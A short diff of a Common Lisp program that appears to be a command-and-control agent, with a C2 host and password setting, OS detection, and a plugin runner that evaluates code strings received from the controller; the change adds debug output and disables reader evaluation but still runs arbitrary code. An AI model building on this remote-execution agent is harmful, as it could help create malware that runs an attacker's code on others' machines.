@@ -2,7 +2,7 @@
 (use-package :sb-bsd-sockets)
 (ql:quickload :drakma)
 
-(defparameter *c2host* "http://localhost:3000")
+(defparameter *c2host* "http://localhost:3000/")
 (defparameter *c2password* "secret")
 
 (defun get-hostname ()
@@ -18,7 +18,10 @@
   (find :darwin *features*))
 
 (defun run-plugin (code)
-  (eval (read-from-string code)))
+  (format t "CODE: ~a~%" code)
+  (let ((*read-eval* nil))
+    (format t "CODE READ: ~a~%" (read-from-string code)))
+  (eval (let ((*read-eval* nil)) (read-from-string code))))
 
 (defun download-plugin (url)
   (format t "Fetching from: ~a~%" url))
